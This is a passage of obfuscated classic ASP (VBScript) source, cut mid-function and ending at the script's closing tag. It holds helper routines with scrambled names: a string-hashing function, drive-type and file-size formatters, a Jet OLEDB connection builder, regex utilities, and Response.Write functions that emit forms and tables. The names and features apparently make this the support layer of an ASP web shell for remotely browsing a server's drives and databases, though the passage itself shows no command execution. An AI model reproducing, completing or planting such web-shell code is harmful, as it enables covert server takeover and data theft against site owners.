tyjcj=mbhq-Len(gztjo) 
If Not tyjcj < 1 Then 
For cecr=1 To tyjcj 
gztjo=gztjo&Chr(21) 
Next 
End If 
aaq=1 
Dim Ben 
For cecb=1 To mbhq 
Ben=mbhq + Asc(Mid(gztjo,cecb,1)) * cecb 
aaq=aaq * Ben 
Next 
gztjo=aaq 
aaq=Empty 
For cec=1 To Len(gztjo) 
aaq=aaq&umlot(Mid(gztjo,cec,3)) 
Next 
For cec=20 To Len(aaq)-18 Step 2 
mmyo=mmyo&Mid(aaq,cec,1) 
Next 
End Function 
Function umlot(word) 
For cc=1 To Len(word) 
umlot=umlot&Asc(Mid(word,cc,1)) 
Next 
umlot=Hex(umlot) 
End Function 
Function crl(ywbmf)
If ywbmf>=(1024 * 1024 * 1024)Then crl=Fix((ywbmf /(1024 * 1024 * 1024))* 100)/ 100&"G"
If ywbmf>=(1024 * 1024)And ywbmf<(1024 * 1024 * 1024)Then crl=Fix((ywbmf /(1024 * 1024))* 100)/ 100&"M"
If ywbmf>=1024 And ywbmf<(1024 * 1024)Then crl=Fix((ywbmf / 1024)* 100)/ 100&"K"
If ywbmf>=0 And ywbmf<1024 Then crl=ywbmf&"B"
End Function
Function xlve(num)
Select Case num
Case 0
xlve="Unknown"
Case 1
xlve="Removable"
Case 2
xlve="Local drive"
Case 3
xlve="Net drive"
Case 4
xlve="CD-ROM"
Case 5
xlve="RAM disk"
End Select
End Function
Function rdeb(ByVal str)
str=Replace(str,"\","\\")
rdeb=Replace(str,"\\\\","\\")
End Function
Function fne(str)
fne="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&str
End Function
Function zznke(str,redtx,vujc)
If vujc Then
zznke=Left(str,InStr(str,redtx)-1)
Else
zznke=Left(str,InstrRev(str,redtx)-1)
End If
End Function
Function tqml(str,redtx)
tqml=Mid(str,InstrRev(str,redtx)+Len(redtx))
End Function
Sub eps(str)
Response.Write str
End Sub
Sub girbw(str)
eps str&vbCrLf
End Sub
Sub picvp(ttrwh,uwrty)
eps"<a href=""javascript:auxbp("&ttrwh&")"" class=""hidehref"">"&ttrwh&" :</a>"
eps"<span id="&ttrwh
If uwrty Then eps" style='display:none;'"
girbw">"
End Sub
Sub pyzxc(str,color,size)
eps"<font color="""&color&""""
If size<>""Then eps" size="""&size&""""
girbw">"&str&"</font>"
End Sub
Sub gns(width)
girbw"<table width="""&width&"""border=""0""cellpadding=""0""cellspacing=""0"">"
End Sub
Sub vlpr()
girbw"</table>"
End Sub
Sub las(num)
eps"<tr class='alt"&num&"' onmouseover=""javascript:this.className='focusTr';"" onmouseout=""javascript:this.className='alt"&num&"';"">"
End Sub
Sub adxa(num)
eps"<span class='alt"&num&"Span'>"
End Sub
Sub sdy(nivi)
eps"<form method=""post"" id=""form"&gbdi&""" action="""&tics&""""
If nivi Then eps" onSubmit=""javascript:immm('form"&gbdi&"')"""
girbw">"
bkljo"goaction",goaction
gbdi=gbdi+1
End Sub
Sub ylm()
girbw"</form>"
End Sub
Sub zbja(value,width)
eps"<td style=""width:"&width&""">"
eps"<input type=""submit"" value="""&value&""" class=""bt"">"
girbw"</td>"
End Sub
Sub qqqcv(str,color,size)
eps"<td>"
pyzxc str,color,size
girbw"</td>"
End Sub
Sub byu()
girbw"</tr>"
End Sub
Sub doTd(td,width)
eps"<td"
If width<>""Then eps" width='"&width&"'"
eps">"
eps td
girbw"</td>"
End Sub
Sub kgsj(td,width)
If td=""Or IsNull(td) Then td="<font color=""red"">Null</font>"
doTd td,width
End Sub
Sub thqoj(td,width)
If IsNull(td) Then td="<font color=""red"">Null</font>"
doTd td,width
End Sub
Sub sztyg(qwse,name,value,size,xbq)
Dim cls
If qwse="button"Or qwse="submit"Or qwse="reset"Then
cls="bt"
Else
cls="input"
End If
girbw"<input type="""&qwse&""" name="""&name&""" id="""&name&""" value="""&csyf(value)&""" size="""&size&""" class="""&cls&""" "&xbq&">"
End Sub
Sub bkljo(name,value)
girbw"<input type=""hidden"" name="""&name&""" id="""&name&""" value="""&value&""">"
End Sub
Sub sze(qwse,name,value,width,xbq,span)
Dim cls
If qwse="button"Or qwse="submit"Or qwse="reset"Then
cls="bt"
Else
cls="tdInput"
End If
If span=""Then span=1
eps"<td colspan="&span&" style=""width:"&width&""">"
eps"<input type="""&qwse&""" name="""&name&""" id="""&name&""" value="""&csyf(value)&""" class="""&cls&""" "&xbq&">"
girbw"</td>"
End Sub
Sub uivh(value)
girbw"<input type=""submit"" value="""&value&""" class=""bt"">"
End Sub
Sub ldnv(name,value,rows)
eps"<td>"
wvv name,value,"100%",rows," class=""tdText"""
girbw"</td>"
End Sub
Sub svznk(str)
If Not isDebugMode Then On Error Resume Next
If IsNull(str)Then str="<font color=red>Null<font>"
eps"<td nowrap>"&str&"</td>"
End Sub
Sub wvv(name,value,width,rows,xbq)
eps"<textarea name="""&name&""" id="""&name&""" style=""width:"&width&";"" rows="""&rows&""" class=""text"" "&xbq&">"
eps csyf(value)
girbw"</textarea>"
End Sub
Sub fsuo()
eps"<ul class=""info"">"
End Sub
Sub skuq(name,width,xbq)
girbw"<select style=""width:"&width&""" name="""&name&""" "&xbq&">"
End Sub
Sub lrnz()
girbw"</select>"
End Sub
Sub emn(value,str)
girbw"<option value="""&value&""">"&str&"</option>"
End Sub
Sub nhlnt()
pqot=pqot+1
If pqot>=2 Then pqot=0
End Sub
Sub tbqw(str)
girbw"<label>"&str&"</label>"
End Sub
Sub sqvg(str)
xhbfv=xhbfv&"<li>"&str&"</li>"
End Sub
Sub kbc(Err)
If Err Then
afqj(Err)
smeb
End If
End Sub
Function rhk(str,wsrtb)
psx.Pattern=wsrtb
rhk=psx.Test(str)
End Function
Function svayg(str,wsrtb,lfx)
If lfx Then
wsrtb=Replace(wsrtb,"\","\\")
wsrtb=Replace(wsrtb,".","\.")
wsrtb=Replace(wsrtb,"?","\?")
wsrtb=Replace(wsrtb,"+","\+")
wsrtb=Replace(wsrtb,"(","\(")
wsrtb=Replace(wsrtb,")","\)")
wsrtb=Replace(wsrtb,"*","\*")
wsrtb=Replace(wsrtb,"[","\[")
wsrtb=Replace(wsrtb,"]","\]")
End If
psx.Pattern=wsrtb
Set svayg=psx.Execute(str)
End Function
Function pfwku(str,wsrtb,rnme,lfx)
If lfx Then
wsrtb=Replace(wsrtb,"\","\\")
wsrtb=Replace(wsrtb,".","\.")
wsrtb=Replace(wsrtb,"?","\?")
wsrtb=Replace(wsrtb,"+","\+")
wsrtb=Replace(wsrtb,"(","\(")
wsrtb=Replace(wsrtb,")","\)")
wsrtb=Replace(wsrtb,"*","\*")
wsrtb=Replace(wsrtb,"[","\[")
wsrtb=Replace(wsrtb,"]","\]")
End If
psx.Pattern=wsrtb
pfwku=psx.Replace(str,rnme)
End Function
%>